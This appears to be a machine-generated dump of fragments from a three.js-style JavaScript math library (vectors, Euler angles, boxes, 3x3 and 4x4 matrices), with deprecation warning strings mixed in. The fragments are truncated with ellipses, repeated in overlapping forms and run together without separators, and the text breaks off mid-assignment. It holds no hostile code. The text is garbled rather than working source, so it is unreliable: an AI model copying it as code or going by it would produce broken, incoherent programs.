;\r\n\r\n\t}Math.ab ... his.z )Math.ab ... his.y )Math.abs( this.x )Math.abs( this.y )Math.abs( this.z )this.z  ...  alpha;this.z  ... * alpha( v.z - ... * alpha( v.z - this.z )v.z - this.zcross:  ... ;\r\n\r\n\t}DEPRECATED: Vector3's .cross() now only accepts one argument. Use .crossVectors( a, b ) instead.this.cr ...  v, w )this.crossVectorsthis.x  ...  * v.y;this.x  ... z * v.yy * v.z - z * v.yy * v.zz * v.ythis.y  ...  * v.z;this.y  ... x * v.zz * v.x - x * v.zz * v.xx * v.zthis.z  ...  * v.x;this.z  ... y * v.xx * v.y - y * v.xx * v.yy * v.xcrossVe ... ;\r\n\r\n\t}var ax  ...  = a.z;ax = a.xay = a.yaz = a.zvar bx  ...  = b.z;bx = b.xby = b.ybz = b.zthis.x  ... z * by;this.x  ... az * byay * bz - az * byay * bzaz * bythis.y  ... x * bz;this.y  ... ax * bzaz * bx - ax * bzaz * bxax * bzthis.z  ... y * bx;this.z  ... ay * bxax * by - ay * bxax * byay * bxproject ... \n\r\n\t}()var v1, dot;v1.copy ... lize();v1.copy ... alize()v1.copy ... rmalizev1.copy( vector )v1.copydot = t ... ( v1 );dot = this.dot( v1 )this.dot( v1 )this.dotreturn  ...  dot );this.co ... ( dot )this.co ... yScalarthis.copy( v1 )var v1;v1.copy ... rmal );v1.copy ... ormal )v1.copy ... nVectorv1.copy( this )return  ... ( v1 );this.sub( v1 )this.subreflect ... \n\r\n\t}()return  ...  ) ) );this.su ... l ) ) )v1.copy ... mal ) )v1.copy ... yScalarv1.copy( normal )2 * thi ... ormal )this.dot( normal )angleTo ... ;\r\n\r\n\t}var the ... th() );theta = ... gth() )this.do ... gth() )this.dot( v )( this. ... gth() )this.le ... ength()v.length()v.lengthreturn  ...  1 ) );Math.ac ... , 1 ) )THREE.M ... -1, 1 )THREE.Math.clampTHREE.Mathvar dx  ...  - v.x;var dy  ...  - v.y;var dz  ...  - v.z;dz = this.z - v.zthis.z - v.zreturn  ... z * dz;dx * dx ... dz * dzdz * dzsetEule ... ;\r\n\r\n\t}setEule ... nMatrixconsole ... ode.");console ... code.")"REMOVE ...  code."REMOVED: Vector3's setEulerFromRotationMatrix has been removed in favor of Euler.setFromRotationMatrix(), please update your code.REMOVED: Vector3's setEulerFromRotationMatrix has been removed in favor of Euler, please update your codesetEule ... ternionREMOVED: Vector3's setEulerFromQuaternion: has been removed in favor of Euler.setFromQuaternion(), please update your code.REMOVED: Vector3's setEulerFromQuaternion: has been removed in favor of EulergetPosi ... ;\r\n\r\n\t}getPosi ... mMatrixconsole ... de." );console ... ode." )"DEPREC ...  code."DEPRECATED: Vector3's .getPositionFromMatrix() has been renamed to .setFromMatrixPosition(). Please update your code. has been renamed to  Please update your codereturn  ... n( m );this.se ... on( m )this.se ... ositionsetFrom ... ositiongetScal ...  );\r\n\t}functio ...  );\r\n\t}{\r\n\r\n\t\t ...  );\r\n\t}DEPRECATED: Vector3's .getScaleFromMatrix() has been renamed to .setFromMatrixScale(). Please update your code.return  ... e( m );this.se ... le( m )this.se ... ixScalegetColu ... ;\r\n\r\n\t}DEPRECATED: Vector3's .getColumnFromMatrix() has been renamed to .setFromMatrixColumn(). Please update your code.return  ... trix );this.se ... atrix )this.se ... xColumnthis.x  ... [ 12 ];this.x  ... s[ 12 ]m.elements[ 12 ]this.y  ... [ 13 ];this.y  ... s[ 13 ]m.elements[ 13 ]this.z  ... [ 14 ];this.z  ... s[ 14 ]m.elements[ 14 ]setFrom ... is;\r\n\t}var sx  ... ngth();sx = th ... ength()this.se ... ength()this.se ... .lengththis.se ...   2 ] )m.elements[ 0 ]m.elements[ 1 ]m.elements[  2 ]var sy  ... ngth();sy = th ... ength()this.se ...   6 ] )m.elements[ 4 ]m.elements[ 5 ]m.elements[  6 ]var sz  ... ngth();sz = th ... ength()this.se ...  10 ] )m.elements[ 8 ]m.elements[ 9 ]m.elements[ 10 ]this.x = sx;this.x = sxthis.y = sy;this.y = sythis.z = sz;this.z = szvar off ... ex * 4;offset = index * 4index * 4var me  ... ements;me = matrix.elementsmatrix.elementsthis.x  ... fset ];this.x  ... ffset ]me[ offset ]this.y  ...  + 1 ];this.y  ... t + 1 ]me[ offset + 1 ]offset + 1this.z  ...  + 2 ];this.z  ... t + 2 ]me[ offset + 2 ]offset + 2return  ... .z ) );( ( v.x ... s.z ) )( v.x = ... his.z )( v.z === this.z )v.z === this.zthis.z = array[ 2 ];this.z = array[ 2 ]return  ... is.z ];[ this. ... his.z ]new THR ... his.z )THREE.V ... 1;\r\n\r\n}THREE.Vector4this.w  ...  w : 1;this.w  ... ? w : 1this.wconstru ... Vector4this.w = w;this.w = wsetW: f ... ;\r\n\r\n\t}this.w = value;this.w = valuecase 3: ... this.w;return this.w;this.w  ... .w : 1;this.w  ... v.w : 1( v.w ! ... v.w : 1( v.w ! ... fined )v.w !== undefinedv.wDEPRECATED: Vector4's .add() now only accepts one argument. Use .addVectors( a, b ) instead.DEPRECATED: Vector4's this.w += v.w;this.w += v.wthis.w += s;this.w += sthis.w = a.w + b.w;this.w = a.w + b.wa.w + b.wa.wb.wDEPRECATED: Vector4's .sub() now only accepts one argument. Use .subVectors( a, b ) instead.this.w -= v.w;this.w -= v.wthis.w = a.w - b.w;this.w = a.w - b.wa.w - b.wthis.w *= scalar;this.w *= scalarvar w = this.w;w = this.wthis.x  ... 2] * w;this.x  ... 12] * we[0] *  ... 12] * we[0] *  ... [8] * ze[12] * wthis.y  ... 3] * w;this.y  ... 13] * we[1] *  ... 13] * we[1] *  ... [9] * ze[9] * ze[13] * wthis.z  ... 4] * w;this.z  ... 14] * we[2] *  ... 14] * we[14] * wthis.w  ... 5] * w;this.w  ... 15] * we[3] *  ... 15] * we[15] * wthis.w *= invScalar;this.w *= invScalarthis.w = 1;this.w = 1setAxis ... ;\r\n\r\n\t}setAxis ... ternionthis.w  ...  q.w );this.w  ... ( q.w )2 * Math.acos( q.w )Math.acos( q.w )var s = ...  q.w );s = Mat ... * q.w )Math.sq ... * q.w )1 - q.w * q.wq.w * q.ws < 0.00011.0E-4this.x = 1;this.x = 1this.x = q.x / s;this.x = q.x / sq.x / sthis.y = q.y / s;this.y = q.y / sq.y / sthis.z = q.z / s;this.z = q.z / sq.z / ssetAxis ... nMatrixvar ang ... te[10];epsilon = 0.01epsilon2 = 0.1if ( (  ... \r\n\r\n\t\t}( Math. ... silon )Math.ab ... epsilonMath.ab ... - m21 )m12 - m21Math.ab ... - m31 )Math.ab ... - m32 )m23 - m32if ( (  ... \n\r\n\t\t\t}( Math. ... ilon2 )Math.ab ... psilon2Math.ab ... + m21 )Math.ab ... + m31 )Math.ab ... + m32 )Math.ab ... 3 - 3 )m11 + m22 + m33 - 3this.se ... 0, 0 );this.se ...  0, 0 )angle = Math.PI;angle = Math.PIvar xx  ...  ) / 2;xx = ( m11 + 1 ) / 2( m11 + 1 ) / 2( m11 + 1 )m11 + 1var yy  ...  ) / 2;yy = ( m22 + 1 ) / 2( m22 + 1 ) / 2( m22 + 1 )m22 + 1var zz  ...  ) / 2;zz = ( m33 + 1 ) / 2( m33 + 1 ) / 2( m33 + 1 )m33 + 1var xy  ...  ) / 4;xy = (  ... 1 ) / 4( m12 + m21 ) / 4( m12 + m21 )var xz  ...  ) / 4;xz = (  ... 1 ) / 4( m13 + m31 ) / 4var yz  ...  ) / 4;yz = (  ... 2 ) / 4( m23 + m32 ) / 4( xx >  ...  > zz )( xx > yy )xx > yy( xx > zz )xx > zz{ // m1 ... \n\r\n\t\t\t}if ( xx ... \r\n\t\t\t\t}xx < epsilonx = 0;y = 0.707106781;y = 0.707106781z = 0.707106781;z = 0.707106781x = Math.sqrt( xx );x = Math.sqrt( xx )Math.sqrt( xx )y = xy / x;y = xy / xxy / xz = xz / x;z = xz / xxz / xif ( yy ... \n\r\n\t\t\t}yy > zz{ // m2 ... \n\r\n\t\t\t}if ( yy ... \r\n\t\t\t\t}yy < epsilonx = 0.707106781;x = 0.707106781y = 0;y = 0y = Math.sqrt( yy );y = Math.sqrt( yy )Math.sqrt( yy )x = xy / y;x = xy / yxy / yz = yz / y;z = yz / yyz / y{ // m3 ... \n\r\n\t\t\t}if ( zz ... \r\n\t\t\t\t}zz < epsilonz = 0;z = 0z = Math.sqrt( zz );z = Math.sqrt( zz )Math.sqrt( zz )x = xz / z;x = xz / zxz / zy = yz / z;y = yz / zyz / zthis.se ... ngle );this.se ... angle )var s = ... 12 ) );s = Mat ... m12 ) )Math.sq ... m12 ) )( m32 - ... - m12 )( m32 - ... - m31 )( m32 - ... - m23 )( m13 - ... - m31 )( m21 - ... - m12 )if ( Ma ...  s = 1;Math.abs( s )s = 1;s = 1this.x  ...  ) / s;this.x  ... 3 ) / s( m32 - m23 ) / sthis.y  ...  ) / s;this.y  ... 1 ) / s( m13 - m31 ) / sthis.z  ...  ) / s;this.z  ... 2 ) / sthis.w  ...  / 2 );this.w  ... ) / 2 )Math.ac ... ) / 2 )( m11 + ... 1 ) / 2( m11 + ... 3 - 1 )m11 + m22 + m33 - 1this.w > v.wthis.w = v.w;this.w = v.wthis.w < v.wthis.w < min.wmin.wthis.w = min.w;this.w = min.wthis.w > max.wmax.wthis.w = max.w;this.w = max.wmin = n ... tor4();min = n ... ctor4()new THREE.Vector4()max = n ... tor4();max = n ... ctor4()floor:  ... \r\n    }this.w  ... is.w );this.w  ... his.w )Math.floor( this.w )ceil: f ... \r\n    }Math.ceil( this.w )round:  ... \r\n    }Math.round( this.w )roundTo ... \r\n    }( this. ... his.w )( this.w < 0 )this.w < 0return  ... ( -1 );this.mu ... r( -1 )return  ...  * v.w;this.x  ... w * v.wthis.w * v.wreturn  ... this.w;this.x  ...  this.wthis.w * this.wreturn  ... is.w );Math.sq ... his.w )Math.ab ... his.w )Math.abs( this.w )if ( ol ... \r\n\r\n\t\t}this.w  ...  alpha;this.w  ... * alpha( v.w - ... * alpha( v.w - this.w )v.w - this.wreturn  ... .w ) );( ( v.x ... s.w ) )( v.x = ... his.w )( v.w === this.w )v.w === this.wthis.w = array[ 3 ];this.w = array[ 3 ]return  ... is.w ];[ this. ... his.w ]new THR ... his.w )THREE.E ... r;\r\n\r\n}functio ... r;\r\n\r\n}{\r\n\r\n\tt ... r;\r\n\r\n}this._o ... tOrder;this._o ... ltOrderthis._orderorder | ... ltOrderTHREE.E ... ltOrderTHREE.E ... ZYX' ];THREE.E ... 'ZYX' ]THREE.E ... nOrders[ 'XYZ' ... 'ZYX' ]THREE.E ...  'XYZ';THREE.E ... = 'XYZ'constru ... E.Euler_order: ... ltOrderget ord ... ;\r\n\r\n\t}return this._order;set ord ... ;\r\n\r\n\t}this._order = value;this._order = valuethis._o ... _order;this._o ... ._orderorder || this._orderthis._x = euler._x;this._x = euler._xthis._y = euler._y;this._y = euler._ythis._z = euler._z;this._z = euler._zeuler._ordervar cla ... .clamp;clamp = ... h.clampvar te = m.elements;var m11 ...  te[8];var m21 ...  te[9];var m31 ... te[10];order = ... _order;order = ... ._orderif ( or ... \r\n\r\n\t\t}order === 'XYZ'this._y ...  1 ) );this._y ... , 1 ) )Math.as ... , 1 ) )clamp( m13, -1, 1 )if ( Ma ... \n\r\n\t\t\t}Math.ab ... 0.99999Math.abs( m13 )this._x ...  m33 );this._x ... , m33 )Math.at ... , m33 )- m23this._z ...  m11 );this._z ... , m11 )Math.at ... , m11 )- m12this._x ...  m22 );this._x ... , m22 )Math.at ... , m22 )order === 'YXZ'this._x ...  1 ) );this._x ... , 1 ) )- clamp ... -1, 1 )clamp( m23, -1, 1 )Math.abs( m23 )this._y ...  m33 );this._y ... , m33 )this._z ...  m22 );this._z ... , m22 )this._y ...  m11 );this._y ... , m11 )- m31order === 'ZXY'clamp( m32, -1, 1 )Math.abs( m32 )order === 'ZYX'clamp( m31, -1, 1 )Math.abs( m31 )order === 'YZX'this._z ...  1 ) );this._z ... , 1 ) )clamp( m21, -1, 1 )Math.abs( m21 )order === 'XZY'clamp( m12, -1, 1 )Math.abs( m12 )console ... order )'WARNIN ... + order'WARNIN ... rder: 'WARNING: Euler.setFromRotationMatrix() given unsupported order: this._order = order;this._order = ordervar sqx = q.x * q.x;sqx = q.x * q.xq.x * q.xvar sqy = q.y * q.y;sqy = q.y * q.yq.y * q.yvar sqz = q.z * q.z;sqz = q.z * q.zq.z * q.zvar sqw = q.w * q.w;sqw = q.w * q.wthis._x ... qz ) );this._x ... sqz ) )Math.at ... sqz ) )2 * ( q ... * q.z )( q.x * ... * q.z )q.x * q ... y * q.zq.x * q.wq.y * q.z( sqw - ... + sqz )sqw - s ... y + sqzsqw - sqx - sqysqw - sqxclamp(  ... -1, 1 )2 * ( q ... * q.w )( q.x * ... * q.w )q.x * q ... y * q.wq.x * q.zq.y * q.wthis._z ... qz ) );this._z ... sqz ) )2 * ( q ... * q.y )( q.z * ... * q.y )q.z * q ... x * q.yq.z * q.wq.x * q.y( sqw + ... - sqz )sqw + s ... y - sqzsqw + sqx - sqysqw + sqxorder ===  'YXZ'this._y ... qz ) );this._y ... sqz ) )q.x * q ... z * q.w( sqw - ... - sqz )sqw - s ... y - sqzsqw - sqx + sqy2 * ( q ... * q.x )( q.y * ... * q.x )q.y * q ... z * q.xq.z * q.x( q.x * ... * q.y )q.x * q ... z * q.yq.z * q.y( q.y * ... * q.z )q.y * q ... x * q.zWARNING: Euler.setFromQuaternion() given unsupported order: reorder ... \n\r\n\t}()var q = ... nion();q = new ... rnion()q.setFr ... this );q.setFr ...  this )q.setFromEulerthis.se ... rder );this.se ... Order )this.se ... ternionreturn  ... rder );( euler ... order )( euler ... is._z )( euler ... is._y )( euler ... is._x )euler._x === this._xeuler._y === this._yeuler._z === this._zeuler._ ... ._orderif ( ar ... y[ 3 ];array[  ... definedthis._o ... y[ 3 ];this._o ... ay[ 3 ]return  ... rder ];[ this. ... order ]new THR ... order )THREE.L ... ;\r\n\r\n};THREE.L ... );\r\n\r\n}THREE.Line3this.st ... tor3();this.st ... ctor3()this.start( start ... ctor3()( start ... fined )start !== undefinedthis.en ... tor3();this.en ... ctor3()this.end( end ! ... ctor3()( end ! ... fined )end !== undefinedTHREE.L ... }\r\n\r\n};THREE.L ... \t}\r\n\r\n}THREE.L ... ototypeconstru ... E.Line3this.st ... tart );this.st ... start )this.start.copythis.en ...  end );this.end.copy( end )this.end.copyline.startthis.en ... .end );this.en ... e.end )line.endcenter: ... ;\r\n\r\n\t}var res ... tor3();result  ... ctor3()optiona ... ctor3()return  ...  0.5 );result. ... ( 0.5 )result. ... yScalarresult. ... s.end )result.addVectorsdelta:  ... ;\r\n\r\n\t}return  ... tart );result. ... start )result.subVectorsreturn  ... .end );this.st ... s.end )this.st ... Squaredthis.st ... tanceToat: fun ... ;\r\n\r\n\t}this.de ... start )this.de ... t ).addthis.de ... ar( t )this.de ... yScalarthis.delta( result )this.deltaclosest ... \n\r\n\t}()closest ... rametervar sta ... tor3();startP  ... ctor3()startEn ... ctor3()startP. ... tart );startP. ... start )startP.subVectorsstartEn ... tart );startEn ... start )startEnd.subVectorsvar sta ... tEnd );startEn ... rtEnd )startEnd.dotvar sta ... artP );startEn ... tartP )var t = ... rtEnd2;t = sta ... artEnd2startEn ... artEnd2if ( cl ... \n\r\n\t\t\t}t = THR ... 0, 1 );t = THR ...  0, 1 )THREE.M ...  0, 1 )return t;closest ... ;\r\n\r\n\t}var t = ... Line );t = thi ... oLine )this.cl ... oLine )this.cl ... rameterthis.st ... trix );this.st ... atrix )this.st ... Matrix4this.en ... trix );this.en ... atrix )this.en ... Matrix4line.st ... s.end )line.st ... start )line.start.equalsline.en ... s.end )line.end.equalsnew THR ...  this )new THR ... ().copynew THREE.Line3()THREE.B ... ;\r\n\r\n};THREE.B ... );\r\n\r\n}THREE.Box2this.mi ... nity );this.mi ... inity )this.min( min ! ... inity )( min ! ... fined )min !== undefinednew THR ... inity )this.ma ... nity );this.ma ... inity )this.max( max ! ... inity )( max ! ... fined )max !== undefined-InfinityTHREE.B ... }\r\n\r\n};THREE.B ... \t}\r\n\r\n}THREE.Box2.prototypeconstru ... EE.Box2this.mi ...  min );this.min.copy( min )this.min.copythis.ma ...  max );this.max.copy( max )this.max.copyif ( po ... \r\n\r\n\t\t}points.length > 0points.lengthvar poi ... s[ 0 ];point = points[ 0 ]points[ 0 ]this.mi ... oint );this.mi ... point )this.ma ... oint );this.ma ... point )for ( v ... \n\r\n\t\t\t}var i = ... .lengthil = points.lengthpoint = points[ i ];point = points[ i ]points[ i ]if ( po ... \r\n\t\t\t\t}point.x < this.min.xpoint.xthis.min.xthis.mi ... oint.x;this.min.x = point.xpoint.x > this.max.xthis.max.xthis.ma ... oint.x;this.max.x = point.xpoint.y < this.min.ypoint.ythis.min.ythis.mi ... oint.y;this.min.y = point.ypoint.y > this.max.ythis.max.ythis.ma ... oint.y;this.max.y = point.ythis.makeEmpty();this.makeEmpty()this.makeEmptyvar v1  ... tor2();v1 = ne ... ctor2()var hal ...  0.5 );halfSiz ... ( 0.5 )v1.copy ... ( 0.5 )v1.copy( size )this.mi ... Size );this.mi ... fSize )this.mi ... r ).subthis.mi ... enter )this.ma ... Size );this.ma ... fSize )this.ma ... r ).addthis.ma ... enter )this.mi ... .min );this.mi ... x.min )box.minthis.ma ... .max );this.ma ... x.max )box.maxmakeEmp ... ;\r\n\r\n\t}this.mi ... finity;this.mi ... nfinityempty:  ... ;\r\n\r\n\t}return  ... in.y );( this. ... min.y )( this. ... min.x )this.ma ... s.min.xthis.ma ... s.min.yvar res ... tor2();result  ... ctor2()optiona ... ctor2()result. ... s.max )size: f ... ;\r\n\r\n\t}return  ... .min );result. ... s.min )expandB ... is;\r\n\t}this.min.minthis.max.maxthis.mi ... ctor );this.mi ... ector )this.min.subthis.ma ... ctor );this.ma ... ector )this.max.addthis.mi ... alar );this.mi ... calar )this.min.addScalar-scalarthis.ma ... alar );this.ma ... calar )this.max.addScalarcontain ... ;\r\n\r\n\t}point.x ... s.max.ypoint.x ... s.min.ypoint.x ... s.max.xreturn false;return true;( this. ... max.y )( this. ... max.x )this.mi ... x.min.xbox.min.x( box.m ... max.x )box.max ... s.max.xbox.max.xthis.mi ... x.min.ybox.min.y( box.m ... max.y )box.max ... s.max.ybox.max.ygetPara ... ;\r\n\r\n\t}return  ... )\r\n\t\t);result. ...  )\r\n\t\t)result.set( point ... min.x )point.x - this.min.x( point ... min.y )point.y - this.min.yisInter ... ;\r\n\r\n\t}if ( bo ... \r\n\r\n\t\t}box.max ... s.min.ybox.max ... s.min.xbox.min ... s.max.xbox.min ... s.max.yclampPo ... ;\r\n\r\n\t}return  ... .max );result. ... ).clampresult.copy( point )result.copydistanc ... \n\r\n\t}()var cla ... .max );clamped ... s.max )v1.copy ... s.max )v1.copy ... ).clampv1.copy( point )return  ... ngth();clamped ... ength()clamped ... .lengthclamped ... point )clampedPoint.subinterse ... ;\r\n\r\n\t}this.min.maxthis.max.minunion:  ... ;\r\n\r\n\t}transla ... ;\r\n\r\n\t}this.mi ... fset );this.mi ... ffset )this.min.addthis.ma ... fset );this.ma ... ffset )box.min ... s.max )box.min ... s.min )box.min.equalsbox.max ... s.max )box.max.equalsnew THREE.Box2()THREE.Box3THREE.Box3.prototypeconstru ... EE.Box3addPoin ... ;\r\n\r\n\t}point.z < this.min.zpoint.zthis.min.zthis.mi ... oint.z;this.min.z = point.zpoint.z > this.max.zthis.max.zthis.ma ... oint.z;this.max.z = point.zthis.ad ... [ i ] )this.addPointvar v1  ... tor3();object. ... true );object. ...  true )object. ... ixWorldobject. ... \t\t\t} );object. ... \n\t\t\t} )object.traverseif ( no ... \r\n\t\t\t\t}node.ge ... definednode.geometrynode.ge ... erticesvar ver ... rtices;vertice ... erticesfor ( v ... \n\t\t\t\t\t}il = vertices.lengthvertices.length{\r\n\r\n\t\t ... \n\t\t\t\t\t}v1.copy ...  i ] );v1.copy ... [ i ] )vertices[ i ]v1.appl ... orld );v1.appl ... World )v1.applyMatrix4node.matrixWorldscope.e ... ( v1 );scope.e ... t( v1 )scope.expandByPointreturn  ... in.z );( this. ... min.z )this.ma ... s.min.zexpandB ... ;\r\n\r\n\t}point.x ... s.max.zpoint.x ... s.min.z( this. ... max.z )this.mi ... x.min.zbox.min.z( box.m ... max.z )box.max ... s.max.zbox.max.z( point ... min.z )point.z - this.min.zbox.max ... s.min.zbox.min ... s.max.zgetBoun ... \n\r\n\t}()var res ... here();result  ... phere()optiona ... phere()new THREE.Sphere()THREE.Sphereresult. ... nter();result. ... enter()result.centerthis.center()result. ...  * 0.5;result. ... ) * 0.5result.radiusthis.si ... ) * 0.5this.si ... ength()this.si ... .lengththis.size( v1 )this.sizereturn result;applyMa ... \n\r\n\t}()var poi ... )\r\n\t\t];points  ... ()\r\n\t\t][\r\n\t\t\tn ... ()\r\n\t\t]points[ ... trix );points[ ... atrix )points[ ... Matrix4points[ ... min.z )points[0].setpoints[0]points[ ... max.z )points[1].setpoints[1]points[2].setpoints[2]points[3].setpoints[3]points[4].setpoints[4]points[5].setpoints[5]points[6].setpoints[6]points[7].setpoints[7]this.se ... ints );this.se ... oints )this.setFromPointsnew THREE.Box3()THREE.M ... 1;\r\n\r\n}THREE.Matrix3this.el ... y( 9 );this.el ... ay( 9 )this.elementsnew Flo ... ay( 9 )te = this.elementste[0] = ... 11 : 1;te[0] = ... n11 : 1( n11 ! ... n11 : 1( n11 ! ... fined )n11 !== undefinedte[3] = n12 || 0;te[3] = n12 || 0te[3]n12 || 0te[6] = n13 || 0;te[6] = n13 || 0n13 || 0te[1] = n21 || 0;te[1] = n21 || 0n21 || 0te[4] = ... 22 : 1;te[4] = ... n22 : 1( n22 ! ... n22 : 1( n22 ! ... fined )n22 !== undefinedte[7] = n23 || 0;te[7] = n23 || 0te[7]n23 || 0te[2] = n31 || 0;te[2] = n31 || 0n31 || 0te[5] = n32 || 0;te[5] = n32 || 0n32 || 0te[8] = ... 33 : 1;te[8] = ... n33 : 1( n33 ! ... n33 : 1( n33 ! ... fined )n33 !== undefinedconstru ... Matrix3te[0] = n11;te[0] = n11te[3] = n12;te[3] = n12te[6] = n13;te[6] = n13te[1] = n21;te[1] = n21te[4] = n22;te[4] = n22te[7] = n23;te[7] = n23te[2] = n31;te[2] = n31te[5] = n32;te[5] = n32te[8] = n33;te[8] = n33identit ... ;\r\n\r\n\t}this.se ... \n\r\n\t\t);this.se ... \r\n\r\n\t\t)var me = m.elements;me = m.elementsme[0]me[3]me[6]me[1]me[4]me[7]me[2]me[5]me[8]DEPRECATED: Matrix3's .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead.DEPRECATED: Matrix3's  Use vector( matrix ) matrix vector.applyMatrix3DEPRECATED: Matrix3's .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead. has been renamed Use matrix( array ) array return  ... y( a );this.ap ... ay( a )this.ap ... r3ArrayapplyTo ... \n\r\n\t}()if ( of ... et = 0;offset === undefinedoffset = 0;offset = 0if ( le ... length;length === undefinedlength  ... length;length  ... .lengtharray.lengthi += 3, j += 3i += 3j += 3var i = ... set, ilj = offsetv1.x = array[ j ];v1.x = array[ j ]array[ j ]v1.y =  ...  + 1 ];v1.y =  ... j + 1 ]array[ j + 1 ]j + 1v1.z =  ...  + 2 ];v1.z =  ... j + 2 ]array[ j + 2 ]j + 2v1.appl ... this );v1.appl ...  this )v1.applyMatrix3array[  ... = v1.x;array[  ...  = v1.xarray[  ... = v1.y;array[  ...  = v1.yarray[  ... = v1.z;array[  ...  = v1.zreturn array;te[0] *= s;te[0] *= ste[3] *= s;te[3] *= ste[6] *= s;te[6] *= ste[1] *= s;te[1] *= ste[4] *= s;te[4] *= ste[7] *= s;te[7] *= ste[2] *= s;te[2] *= ste[5] *= s;te[5] *= ste[8] *= s;te[8] *= sdetermi ... ;\r\n\r\n\t}var a = ...  te[8];a = te[0]b = te[1]c = te[2]d = te[3]e = te[4]f = te[5]g = te[6]h = te[7]i = te[8]return  ...  c*e*g;a*e*i - ... - c*e*ga*e*i - ... + c*d*ha*e*i - ... + b*f*ga*e*i - ... - b*d*ia*e*i - a*f*ha*e*ia*ea*f*ha*fb*d*ib*db*f*gb*fc*d*hc*dc*e*gc*egetInve ... ;\r\n\r\n\t}te[ 0 ] ...  me[9];te[ 0 ] ... * me[9]te[ 0 ]me[10]  ... * me[9]me[10] * me[5]me[10]me[6] * me[9]me[9]te[ 1 ] ...  me[9];te[ 1 ] ... * me[9]te[ 1 ]- me[10 ... * me[9]- me[10] * me[1]- me[10]me[2] * me[9]te[ 2 ] ...  me[5];te[ 2 ] ... * me[5]te[ 2 ]me[6] * ... * me[5]me[6] * me[1]me[2] * me[5]te[ 3 ] ...  me[8];te[ 3 ] ... * me[8]te[ 3 ]- me[10 ... * me[8]- me[10] * me[4]me[6] * me[8]te[ 4 ] ...  me[8];te[ 4 ] ... * me[8]te[ 4 ]me[10]  ... * me[8]me[10] * me[0]me[2] * me[8]te[ 5 ] ...  me[4];te[ 5 ] ... * me[4]te[ 5 ]- me[6] ... * me[4]- me[6] * me[0]- me[6]me[2] * me[4]te[ 6 ] ...  me[8];te[ 6 ] ... * me[8]te[ 6 ]me[9] * ... * me[8]me[9] * me[4]me[5] * me[8]te[ 7 ] ...  me[8];te[ 7 ] ... * me[8]te[ 7 ]- me[9] ... * me[8]- me[9] * me[0]- me[9]me[1] * me[8]te[ 8 ] ...  me[4];te[ 8 ] ... * me[4]te[ 8 ]me[5] * ... * me[4]me[5] * me[0]me[1] * me[4]var det ... e[ 6 ];det = m ... te[ 6 ]me[ 0 ] ... te[ 6 ]me[ 0 ] ... te[ 3 ]me[ 0 ] * te[ 0 ]me[ 0 ]me[ 1 ] * te[ 3 ]me[ 1 ]me[ 2 ] * te[ 6 ]me[ 2 ]if ( de ... \r\n\r\n\t\t}det === 0var msg ...  is 0";msg = " ... t is 0""Matrix ... t is 0"Matrix3.getInverse(): can't invert matrix, determinant is 0: can't invert matrix, determinant is 0if ( th ... \n\r\n\t\t\t}throwOn ... | falsethrow n ...  msg );new Error( msg )console.warn( msg );console.warn( msg )this.identity();this.identity()this.identitythis.mu ...  det );this.mu ... / det )1.0 / dettranspo ... ;\r\n\r\n\t}var tmp ... ements;m = this.elementstmp = m[1];tmp = m[1]m[1]m[1] = m[3];m[1] = m[3]m[3]m[3] = tmp;m[3] = tmptmp = m[2];tmp = m[2]m[2]m[2] = m[6];m[2] = m[6]m[6]m[6] = tmp;m[6] = tmptmp = m[5];tmp = m[5]m[5]m[5] = m[7];m[5] = m[7]m[7]m[7] = tmp;m[7] = tmpflatten ... ;\r\n\r\n\t}array[  ...  te[0];array[  ... = te[0]array[ offset     ]array[  ...  te[1];array[  ... = te[1]array[ offset + 1 ]array[  ...  te[2];array[  ... = te[2]array[ offset + 2 ]array[  ...  te[3];array[  ... = te[3]array[ offset + 3 ]offset + 3array[  ...  te[4];array[  ... = te[4]array[ offset + 4 ]offset + 4array[  ...  te[5];array[  ... = te[5]array[ offset + 5 ]offset + 5array[  ...  te[6];array[  ... = te[6]array[ offset + 6 ]offset + 6array[  ...  te[7];array[  ... = te[7]array[ offset + 7 ]offset + 7array[  ...  te[8];array[  ... = te[8]array[ offset + 8 ]offset + 8getNorm ... ;\r\n\r\n\t}this.ge ... pose();this.ge ... spose()this.ge ... ansposethis.getInverse( m )this.getInversevar m = ... ements;r[ 0 ] = m[ 0 ];r[ 0 ] = m[ 0 ]r[ 0 ]m[ 0 ]r[ 1 ] = m[ 3 ];r[ 1 ] = m[ 3 ]r[ 1 ]m[ 3 ]r[ 2 ] = m[ 6 ];r[ 2 ] = m[ 6 ]r[ 2 ]m[ 6 ]r[ 3 ] = m[ 1 ];r[ 3 ] = m[ 1 ]r[ 3 ]m[ 1 ]r[ 4 ] = m[ 4 ];r[ 4 ] = m[ 4 ]r[ 4 ]m[ 4 ]r[ 5 ] = m[ 7 ];r[ 5 ] = m[ 7 ]r[ 5 ]m[ 7 ]r[ 6 ] = m[ 2 ];r[ 6 ] = m[ 2 ]r[ 6 ]m[ 2 ]r[ 7 ] = m[ 5 ];r[ 7 ] = m[ 5 ]r[ 7 ]m[ 5 ]r[ 8 ] = m[ 8 ];r[ 8 ] = m[ 8 ]r[ 8 ]m[ 8 ]this.el ... rray );this.el ... array )this.elements.setreturn  ... ]\r\n\t\t];[\r\n\t\t\tt ...  ]\r\n\t\t]return  ... \n\r\n\t\t);new THR ... \r\n\r\n\t\t)THREE.Matrix4this.el ... ( 16 );this.el ... y( 16 )new Flo ... y( 16 )te[4] = n12 || 0;te[4] = n12 || 0te[8] = n13 || 0;te[8] = n13 || 0te[12] = n14 || 0;te[12] = n14 || 0te[12]n14 || 0te[5] = ... 22 : 1;te[5] = ... n22 : 1te[9] = n23 || 0;te[9] = n23 || 0te[13] = n24 || 0;te[13] = n24 || 0te[13]n24 || 0te[6] = n32 || 0;te[6] = n32 || 0te[10]  ... 33 : 1;te[10]  ... n33 : 1te[14] = n34 || 0;te[14] = n34 || 0te[14]n34 || 0te[3] = n41 || 0;te[3] = n41 || 0n41 || 0te[7] = n42 || 0;te[7] = n42 || 0n42 || 0te[11] = n43 || 0;te[11] = n43 || 0te[11]n43 || 0te[15]  ... 44 : 1;te[15]  ... n44 : 1te[15]( n44 ! ... n44 : 1( n44 ! ... fined )n44 !== undefinedconstru ... Matrix4te[4] = n12;te[4] = n12te[8] = n13;te[8] = n13te[12] = n14;te[12] = n14te[5] = n22;te[5] = n22te[9] = n23;te[9] = n23te[13] = n24;te[13] = n24te[6] = n32;te[6] = n32te[10] = n33;te[10] = n33te[14] = n34;te[14] = n34te[3] = n41;te[3] = n41te[7] = n42;te[7] = n42te[11] = n43;te[11] = n43te[15] = 